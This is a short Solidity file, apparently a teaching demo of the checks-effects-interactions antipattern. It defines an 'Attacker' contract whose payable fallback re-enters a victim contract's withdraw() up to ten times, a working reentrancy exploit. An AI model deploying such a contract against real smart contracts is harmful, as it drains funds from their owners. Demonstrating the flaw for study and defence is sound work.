pragma solidity ^0.7.0;

import './ChecksEffectsInteractionsAntipattern.sol';

contract Attacker {
  ChecksEffectsInteractionsAntipattern v;
  uint256 public count;


  event LogFallback(uint c, uint balance);

  constructor (ChecksEffectsInteractionsAntipattern victim) {
    v = ChecksEffectsInteractionsAntipattern(victim);
  }

  function attack () public {
    v.withdraw();
  }

  fallback () external payable {
    count++;
    emit LogFallback(count, address(this).balance);
    if (count < 10) {
      v.withdraw();
    } 
  }
}